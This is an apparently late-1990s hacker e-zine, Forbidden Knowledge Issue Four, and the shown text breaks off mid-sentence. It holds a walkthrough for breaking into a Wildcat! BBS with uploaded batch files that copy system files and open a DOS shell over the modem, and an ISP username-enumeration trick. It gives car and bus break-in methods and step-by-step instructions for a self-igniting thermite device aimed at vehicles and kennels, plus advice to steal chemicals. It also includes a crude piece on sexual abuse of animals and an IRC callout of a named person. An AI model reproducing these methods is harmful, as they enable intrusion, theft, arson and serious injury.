@@ -1,0 +1,587 @@
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--=--==-::
+::									      ::
+::       __________            ______ ______________________                  ::
+::       ___  ____/_______________  /____(_)_____  /_____  /___________       ::
+::       __  /_   _  __ \_  ___/_  __ \_  /_  __  /_  __  /_  _ \_  __ \      ::
+::       _  __/   / /_/ /  /   _  /_/ /  / / /_/ / / /_/ / /  __/  / / /      ::
+::       /_/      \____//_/    /_.___//_/  \__,_/  \__,_/  \___//_/ /_/       ::
+::                                                                            ::
+::       ______ __                      ______    _________                   ::
+::       ___  //_/_______________      ____  /__________  /______ _____       ::
+::       __  ,<  __  __ \  __ \_ | /| / /_  /_  _ \  __  /__  __ `/  _ \      ::
+::       _  /| | _  / / / /_/ /_ |/ |/ /_  / /  __/ /_/ / _  /_/ //  __/      ::
+::       /_/ |_| /_/ /_/\____/____/|__/ /_/  \___/\__,_/  _\__, / \___/       ::
+::                                                        /____/              ::
+::                        >>> Issue Four >>>                                  ::
+::									      ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--=--==-::
+
+
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::                    ..ooO Contents of This Issue Ooo..                      ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::                          						      ::
+:: -/- Introduction by The Editor                                             ::
+::                                                                            ::
+:: -/- A more stealthy way to hack a Wildcat! BBS by wyze1                    ::
+:: -/- Improving FreeBSD Logging Stuff by Vortexia                            ::
+:: -/- Finger fun with GiA ZA by Moe1                                         ::
+:: -/- Gerbil Raping Techniques by s0uL					      ::
+:: -/- How to Steal a Volvo or similar car by Flashfire                       ::
+:: -/- Stealing a bus in Portland by supo                                     ::
+:: -/- The Futher-Mucking Melt-Down Bomb by Marc Satur9                       ::
+::                                                                            ::
+:: -/- Conclusion, Greets, All that other stuff that wastes space             ::
+::                                                                            ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+
+
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::                   .ooO Introduction by The Editor Ooo.                     ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::                                                                            ::
+:: Sorry about publishing a wrong release date in FK3, but we since decided   ::
+:: release the zine on a bi-monthly basis, simply because we could not get    ::
+:: enough information into it in in the one month we had set for ourselves,   ::
+:: mostly because we have WAY too much to do for our REAL jobs. ;)            ::
+::                                                                            ::
+:: Aaaah, the joys of good, honest work... And the temptation to write        ::
+:: articles on "Wyzewun's 1001 Ways to kill your Boss" - Maybe one day when   ::
+:: FK is running low on the articles side I will. <g>                         ::
+::                                                                            ::
+:: No, I have to admit that I haven't been working ALL of the time and that   ::
+:: I have had a couple of ocassions to kick my feet up and have a bit of a    ::
+:: rest, although I ended up spending most of my rest time doing stuff like   ::
+:: going to Prodigy concerts with Marc Satur9. Although, to be completely     ::
+:: honest, I don't remember awfully *much* of it. Perhaps I didn't go. Then   ::
+:: again, they say I did, and why would they lie? Oh dear...                  ::
+::									      ::
+:: Well, I certainly remember falling asleep in some bushes somewhere and     ::
+:: waking up to the sound of bad gym music, and having people in odd-looking  ::
+:: gym clothes staring at us for falling asleep there and us staring at       ::
+:: odd-looking people in gym clothes for being fucking nuts enough to want to ::
+:: go to gym at 5 in the morning. But other than that, my memories are fairly ::
+:: hazy. ;) At least we got back to MS's flat eventually. I think. Oh hell, I ::
+:: give up - social events (and the rememberance thereof) have never been my  ::
+:: scene anyway!!! =P                                                         ::
+::									      ::
+:: The zine is not yet at the stage where I would call it the first REAL ish  ::
+:: of FK, but it is without doubt, continously getting better. We are still a ::
+:: young and very much experimental zine and like everyone else, we are       ::
+:: constantly getting just a *little* bit smarter, looking into new things    ::
+:: and adapting ourselves to better suit what our readers want to read.       ::
+::									      ::
+:: We've had quite a bit to deal with, with Vortexia moving to the USA and    ::
+:: all, but the zine is continuing to progress beautifully and the positive   ::
+:: feedback I have recieved from hundreds of readers all over the world is    ::
+:: what really makes it worthwhile. Thankyou for supporting the FK Project.   ::
+::									      ::
+:: The Forbidden Knowledge Crew are...                                        ::
+::                                                                            ::
+::-==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==-::
+:: Editor:		Wyzewun		wyze1@xtc.za.org                      ::
+::                                                                            ::
+:: Co-Editors:	        Vortexia	vortexia@psyche.za.org                ::
+::		        Marc Satur9	satur9@beer.com                       ::
+::                                                                            ::
+:: Ground Crew:	 	SN|PeR		sniper@quake.za.org                   ::
+::                	Moe1		moe1@h4x0rz.za.org                    ::
+::									      ::
+:: ASCII Art:		CyberPhrk	phuman@icon.co.za                     ::
+::                      Brainsaw        pilate@icon.co.za                     ::
+::-==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==-::
+::									      ::
+:: Other stuff included in this issue of Forbidden Knowledge...               ::
+::									      ::
+:: cyberpunk.txt       -=- 	What is Cyberpunk?			      ::
+:: IRC-HOWTO           -=- 	How to be pheered on IRC		      ::
+::								              ::
+:: Please do not send any article submissions or subscription requests to the ::
+:: editor's personal addresses, but to fk@posthuman.za.net which will foward  ::
+:: to all three of us. Thanks for supporting the FK Project.		      ::
+::									      ::
+:: Cheers,								      ::
+:: Wyzewun								      ::
+::								              ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::                
+
+
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::                 .ooO Useless Trick of the Month Ooo.                       ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::								              ::
+:: A MTN Companion Pay-As-You-Go or a Vodacom Vodago Cellphone will continue  ::
+:: to recieve SMS even if you don't load any Service fee in it ever. w00p.    ::
+::									      ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+
+
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::      .ooO A More Stealthy way to Hack a Wildcat BBS by wyze1 Ooo.          ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::									      ::
+:: Shelling into DOS on a Wildcat! 4.0 BBS is fairly easy should one be able  ::
+:: to get co-sysop access to the board. Hard as it may sound, this is in fact ::
+:: much easier than you would originally think it to be. By participating in  ::
+:: the message boards, uploading often and being nice in general, it is quite ::
+:: likely that the sysop will take a liking to you, and seriously consider    ::
+:: doing so when you ask him for co-sysop access.			      ::
+::									      ::
+:: Of course, should he refuse, you'll just have to somehow hack yourself an  ::
+:: account with co-sysop equivalence. But that isn't the point of this        ::
+:: article, the point of this article is to tell you what to do *after* that. ::
+:: The hack is a method originally thought up by RoBoTiC HaMSTeR which I      ::
+:: found to be an unreliable system because of a very big problem which       ::
+:: affected it.								      ::
+::								              ::
+:: The problem with his exploit, or rather, his style of using the exploit,   ::
+:: was that you had to guess what COM port the Sysop's modem was on, and if   ::
+:: you got it wrong - The System locked up, leaving the sysop to find his     ::
+:: beloved BBS frozen in the morning, and a screen that has you trying to do  ::
+:: evil things to it - Not a pleasant situation.			      ::
+::									      ::
+:: So, here's how to go about hacking a Wildcat! BBS in a method which takes a::
+:: little bit longer, but is also a lot more stealthy and won't get you bust. ::
+::								              ::
+:: Go to the co-sysop menu by typing "1" at the menu prompt.		      ::
+::									      ::
+:: Run the "Even management" option. You should see a screen like this:       ::
+::									      ::
+::............................................................................::
+::  #  Description  Schedule Type  Start      Last Execute       Parameters   ::
+:: --- ------------- -------- ---- ------- --------------------   ----------  ::
+::   1 Run batch     SMTWTFS  Soft 12:00am Wed 10/12/94 10:30am   STUFF.BAT   ::
+:: * 2 Run batch     SMTWTFS  Hard 2:00am  Fri 10/28/94 1:00am    FUCTUP.BAT  ::
+::   3 Run batch     SMTWTFS  Hard 3:00am  Sat 08/27/94 12:00am   TERM.BAT    ::
+::   4 Run batch     SMTWTFS  Soft 4:00pm  Wed 10/12/94 4:00pm    MORSTUF.BAT ::
+:: * 5 Reset stats   SMTWTFS  Soft 4:00pm  Thu 10/27/94 12:00pm               ::
+::   6 Run batch     SMTWTFS  Soft 9:00pm  Wed 10/12/94 8:00pm    STUFF.BAT   ::
+:: Current time:  Fri 05/22/99 12:23pm                                        ::
+:: Edit [A]dd, [E]dit, [R]un, [D]elete, [S]chedule, [H]elp, [Q]uit? [ ]       ::
+::............................................................................::
+::                                                                            ::
+:: Now, select [E] to Edit the properties of a scheduled event, you will then ::
+:: see a screen like this...					              ::
+::									      ::
+::............................................................................::
+:: [E]nabled       : No							      ::
+:: [A]ction        : Run batch					              ::
+:: [B]atch file    : C:\WILDCAT\TERM.BAT				      ::
+:: S[h]ell type    : Terminate						      ::
+:: [T]ype          : Hard						      ::
+:: T[i]me          : 12:00						      ::
+:: S[c]hedule      : Daily						      ::
+:: [D]ay           : Sun Mon Tue Wed Thu Fri Sat			      ::
+:: [L]ast executed : 08/27/94 12:00					      ::
+::								              ::
+:: Edit event [S]ave, [Q]uit? [Q]					      ::
+::............................................................................::
+::									      ::
+:: And there you have it - the path for this installation of Wildcat! Now is  ::
+:: where we start to get evil. ;) We know that that WC is in C:\WILDCAT and   ::
+:: we will guess that their upload directory is C:\WILDCAT\UPLOAD and that the::
+:: Misc Files Area is in C:\WILDCAT\MISC				      ::
+::									      ::
+:: Yes, this does mean that we have to do some guessing, but if we get it     ::
+:: wrong, it won't freeze the BBS, so we can keep on trying, and besides,     ::
+:: \MISC and \UPLOAD are bound to be there. Anyway... On with the show...     ::
+::									      ::
+:: We make a batch file with any name, for the purposes of this we will call  ::
+:: it BEER.BAT, on our PC that contains the text:			      ::
+::									      ::
+::............................................................................::
+:: COPY C:\AUTOEXEC.BAT C:\WILDCAT\MISC					      ::
+:: COPY C:\CONFIG.SYS C:\WILDCAT\MISC					      ::
+::............................................................................::
+::									      ::
+:: We then upload this to the files area of the BBS and go back to the Event  ::
+:: Management Menu. We then press "A" to add a scheduled task, and add        ::
+:: C:\WILDCAT\UPLOADS\BEER.BAT - You will then be dropped back to the Menu    ::
+:: where you press [R] to run BEER.BAT straight away.                         ::
+::									      ::
+:: If you got the PATH for the Uploads directory wrong, you will see an error ::
+:: message like...							      ::
+::									      ::
+:: System Error:						              ::
+:: Sysop has been notified, you may continue...			              ::
+::									      ::
+:: And if you see nothing, then you have got it right, and the CONFIG.SYS and ::
+:: AUTOEXEC.BAT for the BBS System should be in the "Miscallaneous Files" Dir ::
+:: If they aren't, then you've guessed the name for that directory wrong - Try::
+:: another one. And don't be alarmed by the sysop notifications. We will BE   ::
+:: Sysop in a few minutes and we can delete them then.			      ::
+::									      ::
+:: Now, we take a look at the Sysop's AUTOEXEC.BAT and/or his CONFIG.SYS and  ::
+:: Lo' and Behold, I can see what COM port his modem is on. :-) Just look for ::
+:: dem horrible little FOSSIL drivers and it will probably be somewhere       ::
+:: amongst the command-line parameters for them.			      ::
+::								              ::
+:: And now, the final step, we make another batch file on our PC's (Called    ::
+:: YEEHAA.BAT in this example) and type the following into it                 ::
+::									      ::
+::............................................................................::
+:: CTTY COM2							              ::
+:: COMMAND								      ::
+::............................................................................::
+::									      ::
+:: Of course, substituting COM2 for the COM port that the system's modem is   ::
+:: on, since we went through all that trouble to find out. We then upload that::
+:: file, run it in the same way we did our previous batch file, using the     ::
+:: event manager and then...						      ::
+::									      ::
+:: C:\WILDCAT>								      ::
+::									      ::
+:: Be good. ;-) 							      ::
+::									      ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+
+
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::           .ooO Improving FreeBSD Logging Stuff by Vortexia Ooo.            ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::									      ::
+:: Unfortunately, we could not get this article, as Vort has been very busy   ::
+:: with his work in America. It will be available on the webpage in a week.   ::
+::									      ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+
+
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::                  .ooO Finger fun with GiA by Moe1 Ooo.                     ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::									      ::
+:: The asigned hostname of somebody who subscribes to Global Internet Access, ::
+:: South Africa, should look something like syn57.anx9.riva.gia.net.za        ::
+::									      ::
+:: And if we finger syn57.anx9.riva.gia.net.za@anx9.riva.gia.net.za we should ::
+:: get their GiA Username. Easy as that. Have phun!                           ::
+::									      ::
+:: <Wyzewun's Comments: This can be adapted to work on any ISP with open      ::
+::  finger ports. You would be suprised how many ISPs just leave them open.>  ::
+::									      ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+
+
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::               .ooO Gerbil Raping Techniques by s0uL Ooo.                   ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::								              ::
+:: h0h, 3y3 t0Ld th3 L4mh0r F]< 3d1T0rz 7h47 3y3 w0uLD h4x0r th31r d0m41N 1f  ::
+:: th3Y d1dNt pUBL|5H m3y3 L33+ 4r+|k1LL 4nD th3y ph34r3d m3 s3w mu<|=| 7h47  ::
+:: 7h3y 4gr33d t3w d3w s0, 4nD f4c3 th3 wr4tH 0f 4w1LL 7h3 L33+ 3d1t0rz L1k3  ::
+:: r0ut3 h3w w4n7 7h1z f0r 7h31r z1n3z! h0h, ph34r.			      ::
+::									      ::
+:: 4ny\/\/4y, L3T m3 g3T t3w th3 g3wd p4rT - th3 s3krUtZ 0f s3xs3ssFuLL       ::
+:: g3rb1L r4p3!!##@ g3rb1L r4p3 <4N b33 h4z4rdu55 4nd s3w 1t 1z v3ry 1mp0rt4nt::
+:: th4t j3w f0LL0w m3y3 1n57ruKcHuNz v3ry c4r3fuLLy...			      ::
+::									      ::
+:: 1) f1nd 4 g3rb1L 0f th3 c0rr3cT t1gHtn3ss f3r j0r w4nG - th1s 1z +|=|3 m0s+::
+::    c0mm0n 3rr0r m4d3 by f1r57-71m3 g3rb1L r4p157z. sh0uLD j3w p1ck 0n3     ::
+::    Th4T 1z t3w t1GHT, 1t 1z L1k3Ly th4t j3w w1LL 0v3rFL0w 7h3 g3rb1L'z     ::
+::    bUFf3r 4t 0x00:s3x0r c4us1nG 4 DoS 4tt4cK 0n 7h3 g3rb1L. 4Lth0ugH th3r3 ::
+::    1z 3xPL017 p0t3nt14L h3r3 - 1t 1z v3ry h4rd t0 pu5H 4n 3xPL01t sTr1nG   ::
+::    1nt0 4 buFF3r wh1cH L13z 1n MuLt|PL3 p13c3z, 4LL 0v3r y0uR sp3c14LLy    ::
+::    ch0s3n g3rb1L-r4p1nG 5urF4c3. :(	Pl33z3 t3LL m3 1f j00 th1N]< 0f 4ny   ::
+::    w4yZ t0 0v3r<u|\/| 7h1z.						      ::
+::									      ::
+:: 2) 455uM1ng j00 h4v3 f0uNd th3 c0rr3cT g3rb1L, th3 n3xT pr0BL3m w3 w1LL b3 ::
+::    f4c3d w1th 1z 1n53rT1ng 0uR p3n1z c0rr3cTLy. w3 sh0uLD 4Ls3w w0rr33     ::
+::    4b0uT d1s34s3s, 4s c4r0LyN m31n3L h4z b33n gn0wn t3w s3x0r g3rb1Lz 4nd  ::
+::    th3y n0w c4rry m4nY 0f h3r g3rmZ. 5h0uLD w3 f41L t3w s3x0r th3 g3rb1L   ::
+::    1n th3 c0rr3cT m4nn3r, w3 m4y c4uz3 p3n4L p4n1cK 0n 0ur 0wn 5y573m,     ::
+::    wh1cH c0uLd d3w m4j0r d4m4g3 t3w 0uR s3x dr1v3. t3w s3x0r th3 g3rb1L    ::
+::    c0rr3ctLy, 3y3 h4v3 wr1tt3n th1s l33t p45/<4L pr0g wh1Ch 1z b31nG       ::
+::    r3L3453d t3w th3 PuBL1k f0r th3 f1r57 71m3 3v3r. phj34r.                ::
+::									      ::
+:: pr0gr4m g3rb1L-s3x0r3r;						      ::
+:: j00z3s n0-c0nd0mz, 4-p4n1z, gn0z3-f3r-sn1ff1N;			      ::
+:: v4r 5m3LL, t4573, s1z3-0f-p4n1z;					      ::
+:: b00L34n uns3x0r4b1LL							      ::
+::									      ::
+:: pr0c3duR3 5n1FF-d4t-p00s33;						      ::
+:: b33g33n;								      ::
+:: 1f 5m3LL = `uN-3L33T` then uns3x0r4b1LL=Tr00;         		      ::
+:: 3L53 uns3x0r4b1LL=F0Lz;						      ::
+:: 3nd;									      ::
+::									      ::
+:: b33g33n;								      ::
+:: 5n1FF-d4t-p00s33;							      ::
+:: s1z3-0f-p4n1z = 0; { j00 4r3 4 h4x0r - 1t 33z 0bv10uSL33 sm4w1LL }         ::
+:: 1f uns3x0r4b1LL=F0Lz th3n puLL-0p3n-p00s33-4nd-s3x0r unt1L p4n1z=s0r3;     ::
+:: 1f uns3x0r4b1LL=Tr00 th3n wr1t3Ln('c4r0Lyn d1z33z4d m4h g3rb|L - b14+<H'); ::
+:: 3nD.									      ::
+::									      ::
+:: 33+ 1z v3r33 s1mPL3, bu7 1+ 1z 3ff3cT1v3 4nD w1LL c0mp1L3 0n 3n33 L1nu><   ::
+:: b0>< (L1nUX 1z th3 pr3ff3r3d 05 0f g3rb1L r4p1sTz c0z b5d 1z un31337).     ::
+:: Pl33z3 f33L phR33 t3w f1nD m3 0n Z4N3T 4nD t3LL m3 h0w muCH j00 L0v3 m3y3  ::
+:: 4rt1kuLL... 4nD 1f 3y3 s4y 3y3 d1d n0t wr1t3 1t - 1gn0r3 m3@!##$@ 3y3 4m   ::
+:: kr4z33 4nd d3Lus10nal 4nD 5tuFF. h0h. unT1L L4t3r... ph34r#@#@$@$#@$       ::
+::									      ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+
+
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::       .ooO How to Steal a Volvo or similar Car by Flashfire Ooo.           ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::								              ::
+:: Just another trick to get into a car by Flashfire. This time its the new   ::
+:: Volvo Coupe. (The small one that *doesnt* look square)		      ::
+::									      ::
+:: Do this :								      ::
+::									      ::
+:: * Find a volvo coupe !						      ::
+:: * Take along a nice heavy 5 kilo hammer				      ::
+:: * Sit in the bushes until its dark					      ::
+:: * Leap out and with the strength of ten titans whack a tyre on the tred.   ::
+::   (The tread, not the wall) 						      ::
+::									      ::
+:: Unless you're kinda wimpy or you fell asleep in the bushes and you've just ::
+:: hit a toddler instead of the volvo, the locks on the doors will pop up.    ::
+::									      ::
+:: This feature was made possible by the kind people at Volvo. They reckon    ::
+:: that if you are in an accident and are knocked unconscious, the para-medics::
+:: wont have to cut open your car to get to you (and avoid the whole          ::
+:: possibility of then cutting your arm off too) Well this is great news since::
+:: we all know how all the other car maker types copy Volvo's saftey features.::
+::								              ::
+:: Hopefuly there will be soon loads of other cars that we can do this to...  ::
+:: Merc's, BMW's, Lambourgini Countach's :) We can only hope.                 ::
+::									      ::
+:: Flashfire sends greets to: Death Veggie, Vortexia, Crazyguy, Cyclotron,    ::
+::                            Wyze1, SN|PeR, Marc Satur9, Opium               ::
+::									      ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+
+
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::               .ooO Stealing a bus in Portland by supo Ooo.                 ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::								              ::
+:: This article is actually being written by wyze1, but it's a trick I learnt ::
+:: from supo, and he deserves the credit. In Portland, Oregon, USA, the buses ::
+:: have a similiar backdoor to that mentioned in Issue One of what was then a ::
+:: very different FK. There is a switch located near the door, under the bus. ::
+:: Flip it and the doors open. Easy as that.                                  ::
+::									      ::
+:: However, supo doesn't recommend actually stealing one. Tri-met (Portland's ::
+:: public transportation organization) equipped most buses with GPS trackers. ::
+:: The buses actually transmit their locations in real time... so they will   ::
+:: know where you are (unless you jam the signal somehow - anybody want to    ::
+:: write an article on this?) Most of the newer buses also have two or more   ::
+:: video cameras that can be activated remotely. (Of course, if you locate    ::
+:: them, it's easy enough to smash them)                                      ::
+::									      ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+
+
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::        .ooO The Futher-Mucking Melt-Down Bomb by Marc Satur9 Ooo.          ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::								              ::
+:: As any self-respecting anarchist, I have an original hard copy of "The     ::
+:: Terrorists Handbook", and having had an occasion or two to blow the shit   ::
+:: outta somethings, I got around to experimenting. What follows is a method  ::
+:: of making a Thermite bomb, that is self igniting and quite powerful. Alot  ::
+:: of what is in the TH got used in "The Anarchist's Cookbook" <Note From the ::
+:: Editor: Except The Anarchists Cookbook is MUCH more full of shit> so it may::
+:: seem familiar, but it is mainly my own adaption for personal use. Please   ::
+:: note, some of this is extremely dangerous, don't get your fucking hand     ::
+:: blown off. 								      ::
+::									      ::
+::                           .ooO Da Shit Ooo.                                ::
+::									      ::
+:: 1. Go out and buy a Can of Coke or something, and get a straw with it.     ::
+::    (I found Jolt Cola Cans worked best, but thats me. ;) Also the bigger   ::
+::    the can, the bigger the blast, the more chemicals you need.)            ::
+::									      ::
+:: 2. Get ahold of some glycerine and potassium permangante (use the white    ::
+::    glycerine from K-Mart or somewhere)			              ::
+::									      ::
+:: 3. Get an amount of iron-oxide (rust) and aluminum filings (both must be   ::
+::    about as fine as powder).						      ::
+::									      ::
+:: 4. Get a lot of magnesium strips or powder.				      ::
+::									      ::
+:: 5. Get ahold of black powder or make your own (I believe there is a method ::
+::    in the Anarchists Cookbook, look for it)				      ::
+::								              ::
+:: [The hard-core chemicals can be stolen from your kindergartens/universitys ::
+:: science lab or if you are lucky enough to know of a science shop get them  ::
+:: there, they won't ask too many questions in this country, just don't buy   ::
+:: all at once.]                                                              ::
+::									      ::
+::                          .ooO Methodus Ooo.                                ::
+::									      ::
+:: 1. Open the coldrink, insert one end of the straw into the can, the other  ::
+::    into your left nostril, block the right and SNORT!!! Or you could just  ::
+::    drink the damn stuff, up to you, clean the can and straw and dry them.  ::
+::    Cut the straw in half (less conspicious)                                ::
+::								              ::
+:: 2. Empty a 3-cm plastic capsule of dry medicine and refill it with the     ::
+::    glycerine. Pour some pottasium permanganate into the straw and insert   ::
+::    the capsule into the top end, be careful not to mix the two chemicals   ::
+::    and an opaque straw helps here.                                         ::
+::									      ::
+:: 3. Drill a hole into the bottom of the can, approx. 0.5 mm and tape over   ::
+::    with one layer of cellotape, now fill the bottom of the can with the    ::
+::    mixture of pure iron-oxide and pure aluminum [THERMITE] (8FeO:3Al) till ::
+::    its about two fingers deep.					      ::
+::									      ::
+:: 4. Tear the magnesium into bits and cover the Thermite entirely with an    ::
+::    even layer of approx. one finger. 				      ::
+::									      ::
+:: 5. Pour the black powder over the magnesium to cover entirely at about half::
+::    a finger full.           						      ::
+::								              ::
+:: 6. Punch a couple of holes at the top of the can to allow for extra        ::
+::    combustion.							      ::
+::								              ::
+:: 7. Insert the straw, DO NOT ATTEMPT TO DRINK!!!, and walk casually over to ::
+::    the target object (Pay-Phone, Vehicle, Dog Kennel) and place the can    ::
+::    casually on top (try not shake the mixture up too much), pretend to     ::
+::    play with the straw and break open the capsule, crushing it thoroughly  ::
+::    (speed is nessecary, you only get 1-3 mins) and casually walk away,     ::
+::    leaving the can behind.						      ::
+::								              ::
+::                         .ooO Schemetix Ooo.                                ::
+::								              ::
+::       !0!      <-CHEMICAL IGNITER (Plastic Medicine Capsule(Glycerine))    ::
+::       !p!  								      ::    
+::       !p!      <-CHEMICAL INGITER (Potassium Permanganate)                 ::
+::    ___!p!___					                              ::
+::   !   !p!   !                                                              ::                     
+::   !   !p!   !                               				      ::
+::   !   !p!   !                       					      ::
+::   !   !p!   !							      ::
+::   {   !p!   }  <- Airholes						      ::
+::   !   !p!   !							      ::
+::   !bbbbbbbbb!  <- PRIMARY IGNITER (Black Powder)			      ::
+::   !MMMMMMMMM!							      ::
+::   !MMMMMMMMM!  <- SECONDARY IGNITER (Magnesium bits)			      ::
+::   !FeAFeAFeA!   							      ::
+::   !FeAFeAFeA!  <- TERTIARARY CHARGE Thermite (Iron-Oxide and Aluminum)     ::
+::   !FeAFeAFeA!						              ::
+::   ^^^^^^^^^^^                                                              ::
+::								              ::
+:: Result:  The can should self-ignite and burn a nice whole through the      ::
+:: target object. A while ago a person I told how to make this attempted to   ::
+:: destroy a car in broad daylight, and well, it was NOT pretty, BE CAREFUL,  ::
+:: this is not a toy. If the mixture does not ignite adjust the different     ::
+:: layers (experiment a little before you make your hit.)		      ::
+::									      ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+
+
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::      .ooO Lamer of the Month and AlphaLinux Secrets From Vortexia Ooo.     ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::									      ::
+:: Yes, it's tame for the Lamer Of the Month Award Again! This time it goes   ::
+:: out to a guy on efnet known as doxx. His claim to fame and some details-   ::
+::									      ::
+:: Doxx is a california resident who *oh get this* hosts alphalinux.org and   ::
+:: is a major part of the alpha linux development team, he also irc ops on    ::
+:: efnet on the idle.net servers and does a lot of network security stuff.    ::
+::                                                                            ::
+:: Ok, so why does he earn the prestigious lamer of the month award... well   ::
+:: as follows, when referring to dear old www.posthuman.za.net:               ::
+::                                                                            ::
+:: <doxx> I'm thinking about doing some bad shit to him                       ::
+:: <doxx> I'm gonna frame him for some bad hacking                            ::
+:: <doxx> not only that.. get his email addy posted all over gay usenet       ::
+:: <eXy-sexy> hah                                                             ::
+:: <eXy-sexy> can you spoof him and hack stuff                                ::
+:: <doxx> I've got a good plan                                                ::
+:: <doxx> yup                                                                 ::
+:: <doxx> that I can do                                                       ::
+:: <doxx> I'd rather own him.. and spam the world                             ::
+:: <doxx> I'm gonna cause shit                                                ::
+:: <doxx> SNPP HACKING                                                        ::
+::									      ::
+:: Ok, now this gets real interesting at this point, you have an alphalinux   ::
+:: person here talking about compromising systems, and framing people for     ::
+:: things that did not do, in my opinon, that goes against every hacker ethic ::
+:: I ever heard of. Secondly, I have to now wonder if he is up to this shit,  ::
+:: what has he been doing to alphalinux if he has his hands in any of code    ::
+:: for it (I dont know if he does, so I cant say), but I wouldnt trust a      ::
+:: system that has any code written by someone like that. <Wyze1: Bah, I      ::
+:: wouldnt Trust Linux anywayz - Get a Life - Get BSD>                        ::
+::									      ::
+:: Secondly this comes from someone who also made claims about cisco routers, ::
+:: ok heads up, according to dear doxx (and I have to say that I dont believe ::
+:: this and its utter bullshit, but well it gives you some idea of the        ::
+:: mentality of this guy), CISCO ROUTER IOS IS 100% OWNED. Yes, according to  ::
+:: dear doxx, there is someone who has write access to the cisco source tree  ::
+:: after its been beta tested etc and is adding backdoors into the system.    ::
+::									      ::
+:: Quite frankly I would have to say that anyone who makes claims like this   ::
+:: is seriously stupid to believe them, or is trying to enhance his ego, or   ::
+:: knows something the world doesnt and definatly shouldnt be shouting it on  ::
+:: irc. Heh personally, I think any of those 3 are completely fuckingpathetic.::
+::									      ::
+:: Ok, yes there is even more on this obnoxious, stupid prick.  Doxx.net hosts::
+:: commercial shells on a nice alpha server.  So he needs to get into certain ::
+:: channels which will remain unnamed, so he gives everyone shells on his box,::
+:: a while later he cuts them all, says they are taking too many system       ::
+:: resources.  Ok now this I can handle, they were free, its his box, he has  ::
+:: every right to kill them.  But heres the problem, he gives no warning and  ::
+:: he closes them without giving anyone the chance to retrieve their data,    ::
+:: later after taking some heavy flak over this, he says email me and I will  ::
+:: send you the stuff from your shells, I have it all on tape backup.         ::
+::									      ::
+:: HOWEVER, when certain people emailed him for their web pages, their data   ::
+:: etc, he responded with "WHO ARE YOU" or not at all, and they got no data.  ::
+:: So yeah he got what he wanted, and then he took it all back and erased ppls::
+:: data with it, heh talk about an Indian Giver.                              ::
+::									      ::
+:: Anyway, so thats your heads up on our lamer of the month, and the          ::
+:: alphalinux development people over at doxx.net                             ::
+::									      ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+
+
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::                       .ooO Thanks and Greets Ooo.                          ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::								              ::
+::                              Group Greets:				      ::
+::                    b4b0, cDc, EHAP, HNN, L0pht, LoU                        ::
+::									      ::
+::                            Personal Greets:				      ::
+:: Aleph1, Cache, CrazyGuy, Cyber Demon, Cyclotron, DilDog, Grey Wolf, Hen-I, ::
+::      Kool4Katz, kokey, Mnemonic, mudge, Opium, Sector12, Tattooman         ::
+::									      ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+
+
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::                           .ooO Next Issue Ooo.                             ::
+::--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==--==::
+::								              ::
+:: The next Issue will be released at Midnight (SAST) on the 3rd of June, and ::
+:: will be available at Posthuman Systems and PacketStorm Security.           ::
+::								              ::
+:: We will be releasing code by the people here at Posthuman Systems for the  ::
+:: first time, and it will simply be the best FK ever. If you miss it your    ::
